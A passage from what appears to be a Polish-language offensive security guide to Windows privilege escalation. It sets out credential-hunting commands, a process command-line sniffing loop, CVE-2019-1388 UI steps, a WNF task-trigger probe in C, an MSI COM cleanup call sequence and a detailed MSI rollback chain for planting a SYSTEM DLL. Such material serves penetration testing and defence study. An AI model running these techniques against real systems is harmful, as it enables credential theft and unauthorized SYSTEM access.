W przypadku Firefoksa [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), że pliki `key4.db` i `logins.json` w profilu stanowią parę: klucz i zaszyfrowane loginy. Ich obecność jest jedynie wskazówką: sprawdź, czy oba pliki są czytelne, czy istnieją zapisane wpisy oraz czy klucz jest chroniony hasłem głównym (Primary Password), zanim uznasz poświadczenia za użyteczne. Jeśli odzyskane poświadczenie należy do konta domenowego, osobno sprawdź efektywne uprawnienia tego konta do zarządzania grupami oraz uprawnienia grupy do [odczytu lub odszyfrowywania haseł LAPS](../active-directory-methodology/laps.md); same artefakty przeglądarki nie potwierdzają ścieżki do uzyskania uprawnień administratora.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a każdy komponent udostępnia funkcje za pośrednictwem jednego lub większej liczby interfejsów, identyfikowanych za pomocą identyfikatorów interfejsu (IID).

Klasy i interfejsy COM są zdefiniowane w rejestrze odpowiednio w kluczach **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ten rejestr powstaje przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Wśród kluczy CLSID tego rejestru można znaleźć podrzędny klucz **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może przyjmować wartość **Apartment** (jednowątkowy), **Free** (wielowątkowy), **Both** (jedno- lub wielowątkowy) albo **Neutral** (niezależny od wątku).

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

Zasadniczo, jeśli możesz **nadpisać dowolny z DLL**, które zostaną uruchomione, możesz **eskalować uprawnienia**, jeśli ten DLL zostanie uruchomiony przez innego użytkownika.

Aby dowiedzieć się, jak atakujący wykorzystują COM Hijacking jako mechanizm utrzymywania dostępu, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Wyszukiwanie haseł w plikach i rejestrze**

**Wyszukiwanie treści plików**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Wyszukaj plik o określonej nazwie**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Narzędzia do wyszukiwania haseł

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **to plugin msf**, który utworzyłem, aby **automatycznie uruchamiać każdy moduł POST metasploit wyszukujący dane uwierzytelniające** na komputerze ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wyodrębniania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** używane przez kilka narzędzi, które zapisują te dane jawnym tekstem (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy też nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, który dziedziczy wszystkie otwarte uchwyty procesu nadrzędnego**.\
Jeśli uzyskasz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **otwarty uchwyt do uprzywilejowanego procesu utworzony** przez `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby dowiedzieć się więcej o **wykrywaniu i wykorzystywaniu tej luki**.](leaked-handle-exploitation.md)\
[Przeczytaj też [**ten wpis**, aby uzyskać pełniejsze wyjaśnienie, jak testować i nadużywać większej liczby otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenty pamięci współdzielonej, nazywane **potokami**, umożliwiają komunikację między procesami i przesyłanie danych.

Windows udostępnia funkcję o nazwie **Named Pipes**, która pozwala niepowiązanym procesom współdzielić dane, nawet przez różne sieci. Przypomina to architekturę klient/serwer, w której role określa się jako **serwer named pipe** i **klient named pipe**.

Gdy **klient** wysyła dane przez potok, **serwer**, który go skonfigurował, może **przyjąć tożsamość** **klienta**, o ile ma wymagane uprawnienia **SeImpersonate**. Znalezienie **uprzywilejowanego procesu**, który komunikuje się przez potok, pod który możesz się podszyć, daje możliwość **uzyskania wyższych uprawnień** przez przyjęcie tożsamości tego procesu, gdy wejdzie on w interakcję z utworzonym przez Ciebie potokiem. Instrukcje dotyczące przeprowadzenia takiego ataku znajdziesz [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](#from-high-integrity-to-system).

Poniższe narzędzie umożliwia również **przechwytywanie komunikacji named pipe za pomocą narzędzia takiego jak Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a to narzędzie pozwala wyświetlić listę wszystkich potoków i przejrzeć je w poszukiwaniu privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Usługa Telephony (TapiSrv) działająca w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Zdalny, uwierzytelniony klient może nadużyć asynchronicznej ścieżki zdarzeń opartej na mailslotach, aby przekształcić `ClientAttach` w dowolny **zapis 4-bajtowy** do dowolnego istniejącego pliku, do którego zapisu ma uprawnienia `NETWORK SERVICE`, a następnie uzyskać uprawnienia administratora Telephony i załadować dowolną bibliotekę DLL jako usługa. Pełny przebieg:

- `ClientAttach` z `pszDomainUser` ustawionym na istniejącą ścieżkę, do której można zapisywać → usługa otwiera ją przez `CreateFileW(..., OPEN_EXISTING)` i używa do zapisu asynchronicznych zdarzeń.
- Każde zdarzenie zapisuje do tego uchwytu kontrolowany przez atakującego `InitContext` z `Initialize`. Zarejestruj aplikację linii za pomocą `LRegisterRequestRecipient` (`Req_Func 61`), wywołaj `TRequestMakeCall` (`Req_Func 121`), pobierz zdarzenia przez `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj aplikację lub zamknij połączenie, aby powtarzać deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` z dowolną ścieżką biblioteki DLL, aby wykonać `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej szczegółów:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą uruchamiać pliki w Windows

Zajrzyj na stronę **[https://filesec.io/](https://filesec.io/)**

### Nadużywanie obsługi protokołów / ShellExecute za pośrednictwem rendererów Markdown

Klikalne linki Markdown przekazywane do `ShellExecuteExW` mogą uruchamiać niebezpieczne URI handlers (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany schemat) i wykonywać pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie wierszy poleceń w poszukiwaniu haseł**

Po uzyskaniu shella jako użytkownik mogą być uruchamiane zaplanowane zadania lub inne procesy, które **przekazują poświadczenia w wierszu poleceń**. Poniższy skrypt przechwytuje wiersze poleceń procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wyświetlając wszelkie różnice.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Wykradanie haseł z procesów

## Od użytkownika o niskich uprawnieniach do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP), a UAC jest włączone, w niektórych wersjach Microsoft Windows można uruchomić terminal lub dowolny inny proces jako „NT\AUTHORITY SYSTEM” z poziomu użytkownika bez uprawnień.

Dzięki tej samej podatności można jednocześnie eskalować uprawnienia i ominąć UAC. Dodatkowo nie trzeba niczego instalować, a plik binarny używany podczas tego procesu jest podpisany i wydany przez Microsoft.

Niektóre z podatnych systemów to:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Aby wykorzystać tę podatność, należy wykonać następujące kroki:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Masz wszystkie niezbędne pliki i informacje w repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od poziomu integralności Medium Administratora do High / obejście UAC

Przeczytaj to, aby **dowiedzieć się więcej o poziomach integralności**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj to, aby dowiedzieć się więcej o UAC i obejściach UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions katalogu przesyłania plików w katalogu głównym udostępnianym przez serwer

Aplikacja może tworzyć przewidywalny podkatalog do przesyłania plików, zapisywać w nim plik o nazwie podanej przez użytkownika, a następnie go przetwarzać. Jeśli użytkownik z niskimi uprawnieniami może usunąć ten podkatalog i zastąpić go junction NTFS przed zapisem po stronie serwera, zapis może podążyć za junction do katalogu udostępnianego przez serwer WWW. Umieszczony tam skrypt może zostać uruchomiony z tożsamością usługi WWW, jeśli serwer wykonuje pliki tego typu. Jest to specyficzna dla aplikacji granica dowolnego zapisu; sam katalog do przesyłania plików z prawem zapisu lub istniejący junction tego nie dowodzą.

Sprawdź dokładny sposób konstruowania ścieżki i moment zapisu w handlerze przesyłania plików, efektywne uprawnienia użytkownika do usuwania i tworzenia podkatalogu, efektywne listy ACL miejsca docelowego, czy proces zapisujący podąża za punktami ponownej analizy oraz czy serwer WWW wykonuje pliki w tym miejscu docelowym. Osobno potwierdź tożsamości procesów zapisującego i serwera WWW. Pasywna inwentaryzacja może wykazać listy ACL katalogu i metadane punktów ponownej analizy, ale nie może potwierdzić zachowania handlera ani przyszłej podmiany junction. Jeśli wykonanie następuje w kontekście konta usługi, przed rozważeniem odrębnej ścieżki związanej z uprawnieniami tokenu sprawdź **rzeczywisty token procesu**.

## Wyzwalane przez WNF czyszczenie zaplanowanych zadań z podwyższonymi uprawnieniami

Zaplanowane zadanie, które blokuje ręczne uruchomienie, może mimo to udostępniać nieuprzywilejowany mechanizm wyzwalania. Podczas audytu zadania z podwyższonymi uprawnieniami wyeksportuj jego XML i sprawdź **wszystkie** wyzwalacze, a także DACL zadania, podmiot i akcję. W szczególności `WnfStateChangeTrigger` wskazuje stan Windows Notification Facility (WNF); jeśli ten stan z zabezpieczeniami pozwala bieżącemu użytkownikowi opublikować aktualizację, użytkownik może pośrednio uruchomić zadanie z skonfigurowaną tożsamością, mimo ustawienia `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na przykład zadanie Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` działało jako SYSTEM, przyjmowało od zwykłego użytkownika aktualizacje stanu WNF `7508BCA32C079E41`, a następnie sprawdzało `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` nawet wtedy, gdy Recall było wyłączone.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Aby przetestować osiągalność, pobierz adres `ZwUpdateWnfStateData` z `ntdll.dll`, prześlij pustą aktualizację dla ośmiobajtowej nazwy stanu i skoreluj kod statusu z danymi o ostatnim uruchomieniu zadania lub aktywnością Procmon. Poniższa uproszczona sonda używa sekwencji bajtów z przykładu zadania Recall; zastąp ją bajtami wyeksportowanymi dla testowanego zadania.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Przekształcenie rekurencyjnego czyszczenia w uprzywilejowane usuwanie

Przydatnym prymitywem jest nie sam trigger, lecz uprzywilejowana procedura czyszczenia, która przyjmuje katalog kontrolowany przez atakującego. Prześledź operację od enumeracji do końcowej modyfikacji: wykrywanie profili/sesji, dzieci wybierane za pomocą wildcardów, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` to mocne przesłanki, że wcześniej sprawdzona ścieżka zostanie później przetworzona rekurencyjnie. Jeśli elementy potomne nie są otwierane względem zaufanych uchwytów katalogów i weryfikowane przed usunięciem, atakujący może zmienić sposób rozstrzygania ścieżki między enumeracją a użyciem.<sup>[[43]](#references)</sup>

Połącz trigger WNF z opisaną poniżej [podmianą za pomocą oplocka, junction i symlinka Object Manager](#from-folder-contents-delete-to-system-eop): oplock wstrzymuje proces czyszczenia po wybraniu przez niego prawidłowego elementu potomnego, a następnie zapisywalny katalog nadrzędny zostaje podmieniony, tak aby wznowione uprzywilejowane usuwanie prowadziło przez `\RPC Control` do chronionego celu. W łańcuchu Recall doprowadziło to do usunięcia przez SYSTEM `C:\Config.Msi`, wymaganego przez opisaną technikę rollbacku MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Zagnieżdżone elementy potomne omijają powierzchowne poprawki dotyczące punktów ponownej analizy

Weryfikacja wyłącznie katalogu kontrolowanego przez atakującego i jego bezpośredniego elementu potomnego nie zabezpiecza rekurencyjnego usuwania opartego na ścieżce. Pozostaw sprawdzone obiekty bez zmian i przenieś podmianę junction/oplock do dodatkowego elementu potomnego znajdującego się głębiej; `IFileOperation::DeleteItem` ostatecznie dotrze do nieweryfikowanego elementu potomnego i podąży za jego nowym celem. CVE-2026-20941 powstało właśnie w wyniku takiej niekompletnej poprawki: pierwsza poprawka Recall weryfikowała `UKP` i katalog o nazwie w formacie GUID, ale pozostawiała starą operację rekurencyjnego usuwania.<sup>[[43]](#references)</sup>

Bezpieczny wzorzec polega na otwieraniu **każdego elementu potomnego** względem już zaufanego uchwytu katalogu, uzyskaniu i zweryfikowaniu ostatecznej rozstrzygniętej ścieżki/obiektu oraz zastosowaniu dyspozycji usunięcia do tego zweryfikowanego uchwytu. Nie weryfikuj prefiksu, a potem nie wracaj do rekurencyjnego usuwania opartego na ścieżce. Podczas przeglądu poprawek sprawdzaj też struktury w rzeczywistym miejscu wywołania: w tym przypadku inspekcja działania programu wykazała, że `OBJECT_ATTRIBUTES` w `NtCreateFile` zawiera niepusty `RootDirectory` i względną nazwę `{GUID}\\secure_file.lock`, co obaliło mylący wynik dekompilacji sugerujący drugi prymityw `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od dowolnego usuwania/przenoszenia/zmiany nazwy folderu do SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) wraz z kodem exploita [**dostępnym tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Atak polega zasadniczo na nadużyciu funkcji rollbacku Windows Installer w celu zastąpienia prawidłowych plików złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi utworzyć **złośliwy instalator MSI**, który posłuży do przejęcia folderu `C:\Config.Msi`. Windows Installer użyje go później do przechowywania plików rollbacku podczas odinstalowywania innych pakietów MSI; pliki rollbacku zostaną wcześniej zmodyfikowane tak, aby zawierały złośliwy payload.

### Wstrzyknięcie ścieżki czyszczenia COM Windows Installer (CVE-2025-27727)

Klient z niskimi uprawnieniami może uzyskać dostęp do usługi SYSTEM `msiexec.exe` za pośrednictwem obiektu COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Inżynieria wsteczna pozwoliła zidentyfikować odpowiednie wywołania `IMsiServer`: `MsiBeginTransactionW` przy przesunięciu `0xA0` w vtable, `SetEEUIDirectoryAndFilter` przy `0xC8` oraz `CleanupTempPackages` przy `0x50`. Nazwy i przesunięcia ustalono metodą inżynierii wstecznej i mogą się różnić między kompilacjami.<sup>[[41]](#references)</sup>

W przypadku użytkownika niebędącego administratorem `SetEEUIDirectoryAndFilter` podszywa się pod klienta tylko podczas otwierania podanej ścieżki z flagami `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Dowodzi to, że klient może usunąć katalog, i zapobiega podążaniu za punktem ponownej analizy, ale **nie** wiąże sprawdzonego obiektu pliku z późniejszym czyszczeniem ani nie dowodzi, że został on utworzony przez Windows Installer.<sup>[[41]](#references)</sup>

Po `MsiBeginTransactionW` metoda `SetEEUIDirectoryAndFilter` zaplanowuje ścieżkę jako folder niezależnie od argumentu filtra podanego przez klienta. Usługa zapisuje nazwaną wartość `REG_DWORD` w kluczu `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: nazwa wartości to ścieżka kontrolowana przez klienta, a dane `0x00000002` oznaczają flagę folderu. Następnie `CleanupTempPackages(NULL, FALSE)` bezpośrednio rozpoczyna czyszczenie. Jego podwyższony worker enumeruje wartości rejestru i przekazuje wpisy folderów do rekurencyjnej funkcji `FDeleteFolder`, nie sprawdzając pochodzenia ścieżek. Jeśli zwykłe usuwanie się nie powiedzie, kod wywołuje również `LockdownPath`, czyści atrybuty pliku i ponawia próbę.<sup>[[41]](#references)</sup>

Minimalna sekwencja wywołań odzyskana z `msi.dll` to:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Użytecznym prymitywem jest ponowne wykorzystanie ścieżki, a nie przekierowanie przez junction. Zarejestruj utworzone przez atakującego `C:\Config.Msi`, usuń je i pozwól Windows Installerowi później odtworzyć tę samą ścieżkę z chronionymi danymi rollback. Podczas czyszczenia system ufa nieaktualnej nazwie `TempPackages` i usuwa nowy katalog jako SYSTEM. To omija zamierzoną ochronę zapewnianą przez `FILE_FLAG_OPEN_REPARSE_POINT` i mechanizm ograniczający zaufanie do przekierowań, ponieważ nie jest wymagany żaden reparse point.<sup>[[41]](#references)</sup>

Ten prymityw usuwania pasuje do poniższego łańcucha rollback: zachowaj osobny wpis `Installer\Folders`, usuń chroniony `C:\Config.Msi`, odtwórz go z NULL DACL i zachowaj uchwyt z uprawnieniem `WRITE_DAC`, otwarty przed zaostrzeniem DACL przez installer. Wstępnie otwarty uchwyt może przywrócić permisywną DACL za pomocą `NtSetSecurityObject`, po czym wygenerowany plik `.rbs` można podmienić przed wznowieniem rollback.<sup>[[41]](#references)</sup>

Microsoft naprawił ten problem, uniemożliwiając `CMsiTransaction::SetEEUIDirectoryAndFilter` wywołanie `ScheduleFileOrFolderDelete`, gdy włączona jest nowa funkcja feature gate. Wywołanie COM nadal może zwrócić sukces, ale ścieżka kontrolowana przez atakującego nie jest już dodawana do `TempPackages`. Zainstaluj aktualizacje zabezpieczeń Windows z kwietnia 2025 r., zamiast traktować pomyślny zwrot metody jako test zastosowania poprawki.<sup>[[41]](#references)[[42]](#references)</sup>

Podsumowana technika wygląda następująco:

1. **Etap 1 – Przygotowanie do przejęcia (pozostawienie pustego `C:\Config.Msi`)**

- Krok 1: Zainstaluj MSI
    - Utwórz plik `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w folderze z prawami zapisu (`TARGETDIR`).
    - Oznacz installer jako **"UAC Compliant"**, aby **użytkownik bez uprawnień administratora** mógł go uruchomić.
    - Po instalacji pozostaw otwarty **uchwyt** do pliku.

- Krok 2: Rozpocznij odinstalowywanie
    - Odinstaluj ten sam plik `.msi`.
    - Proces odinstalowywania zacznie przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie zapasowe rollback).
    - **Sprawdzaj otwarty uchwyt** za pomocą `GetFinalPathNameByHandle`, aby wykryć moment, w którym plik zmieni się w `C:\Config.Msi\<random>.rbf`.

- Krok 3: Własna synchronizacja
    - Plik `.msi` zawiera **własną akcję odinstalowywania (`SyncOnRbfWritten`)**, która:
        - Sygnalizuje zapisanie pliku `.rbf`.
        - Następnie **czeka** na inne zdarzenie, zanim będzie kontynuować odinstalowywanie.

- Krok 4: Zablokuj usunięcie pliku `.rbf`
    - Po otrzymaniu sygnału **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — to **uniemożliwia jego usunięcie**.
    - Następnie **odeślij sygnał**, aby odinstalowywanie mogło się zakończyć.
    - Windows Installer nie może usunąć pliku `.rbf`, a ponieważ nie może usunąć całej zawartości, **`C:\Config.Msi` nie zostaje usunięty**.

- Krok 5: Ręcznie usuń plik `.rbf`
    - Ręcznie usuń plik `.rbf`.
    - Teraz **`C:\Config.Msi` jest pusty** i gotowy do przejęcia.

> W tym momencie **uruchom podatność umożliwiającą usunięcie dowolnego folderu na poziomie SYSTEM**, aby usunąć `C:\Config.Msi`.

2. **Etap 2 – Zastępowanie skryptów rollback złośliwymi skryptami**

- Krok 6: Odtwórz `C:\Config.Msi` ze słabymi ACL
    - Odtwórz folder `C:\Config.Msi`.
    - Ustaw **słabe DACL** (np. Everyone:F) i **pozostaw otwarty uchwyt** z uprawnieniem `WRITE_DAC`.

- Krok 7: Uruchom kolejną instalację
    - Ponownie zainstaluj plik `.msi`, ustawiając:
        - `TARGETDIR`: lokalizację z prawami zapisu.
        - `ERROROUT`: zmienną, która wymusza błąd.
    - Ta instalacja posłuży do ponownego uruchomienia **rollback**, który odczytuje pliki `.rbs` i `.rbf`.

- Krok 8: Monitoruj pojawienie się pliku `.rbs`
    - Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi` do czasu pojawienia się nowego pliku `.rbs`.
    - Zapisz jego nazwę.

- Krok 9: Synchronizuj przed rollback
    - Plik `.msi` zawiera **własną akcję instalacji (`SyncBeforeRollback`)**, która:
        - Sygnalizuje zdarzenie po utworzeniu pliku `.rbs`.
        - Następnie **czeka** przed kontynuowaniem.

- Krok 10: Ponownie zastosuj słabe ACL
    - Po otrzymaniu zdarzenia `plik .rbs utworzony`:
        - Windows Installer **ponownie nakłada silne ACL** na `C:\Config.Msi`.
        - Ponieważ nadal masz uchwyt z uprawnieniem `WRITE_DAC`, możesz **ponownie zastosować słabe ACL**.

> ACL są **sprawdzane tylko podczas otwierania uchwytu**, więc nadal możesz zapisywać w folderze.

- Krok 11: Umieść fałszywe pliki `.rbs` i `.rbf`
    - Nadpisz plik `.rbs` **fałszywym skryptem rollback**, który instruuje Windows, aby:
        - Przywrócił plik `.rbf` (złośliwą bibliotekę DLL) w **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Umieść fałszywy plik `.rbf` zawierający **złośliwy payload DLL działający na poziomie SYSTEM**.

- Krok 12: Uruchom rollback
    - Zasygnalizuj zdarzenie synchronizacji, aby installer wznowił działanie.
    - **Własna akcja typu 19 (`ErrorOut`)** jest skonfigurowana tak, by **celowo zakończyć instalację błędem** w znanym punkcie.
    - Powoduje to rozpoczęcie **rollback**.

- Krok 13: SYSTEM instaluje Twoją bibliotekę DLL
    - Windows Installer:
        - Odczytuje Twój złośliwy plik `.rbs`.
        - Kopiuje Twoją bibliotekę DLL `.rbf` do docelowej lokalizacji.
    - Masz teraz **złośliwą bibliotekę DLL w ścieżce, z której ładuje ją SYSTEM**.

- Ostatni krok: Wykonaj kod jako SYSTEM
    - Uruchom zaufany **automatycznie podwyższający uprawnienia plik binarny** (np. `osk.exe`), który ładuje przejętą bibliotekę DLL.
    - **Gotowe**: Twój kod wykonuje się **jako SYSTEM**.


### Od dowolnego usuwania/przenoszenia/zmiany nazwy pliku do SYSTEM EoP

Główna technika MSI rollback (opisana powyżej) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co, jeśli podatność pozwala tylko na **usuwanie dowolnych plików**?

Możesz wykorzystać **wewnętrzne mechanizmy NTFS**: każdy folder ma ukryty alternatywny strumień danych o nazwie:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ten strumień przechowuje **metadane indeksu** folderu.

Jeśli więc **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usunie cały folder** z systemu plików.

Możesz to zrobić za pomocą standardowych API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mimo że wywołujesz API usuwania *pliku*, **usuwa ono sam folder**.

### Od usuwania zawartości folderu do SYSTEM EoP
Co jeśli Twoja primitive nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać *zawartość* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder-przynętę i plik
- Utwórz: `C:\temp\folder1`
- W nim utwórz: `C:\temp\folder1\file1.txt`

2. Krok 2: Ustaw **oplock** na `file1.txt`
- Oplock **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Krok 3: Wyzwól proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usuwać ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje wyzwolony** i przekazuje sterowanie do Twojego callbacka.

4. Krok 4: W callbacku oplocka — przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` gdzie indziej
    - Spowoduje to opróżnienie `folder1` bez przerywania oplocka.
    - Nie usuwaj bezpośrednio `file1.txt` — to przedwcześnie zwolniłoby oplock.

- Opcja B: Zmień `folder1` w **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> To celuje w wewnętrzny strumień NTFS, który przechowuje metadane folderu — jego usunięcie usuwa folder.

5. Krok 5: Zwolnij oplock
- Proces SYSTEM działa dalej i próbuje usunąć `file1.txt`.
- Jednak teraz, z powodu junction + symlink, tak naprawdę usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Wynik**: `C:\Config.Msi` został usunięty przez SYSTEM.

### Od utworzenia dowolnego folderu do trwałego DoS

Wykorzystaj prymityw umożliwiający **utworzenie dowolnego folderu jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```

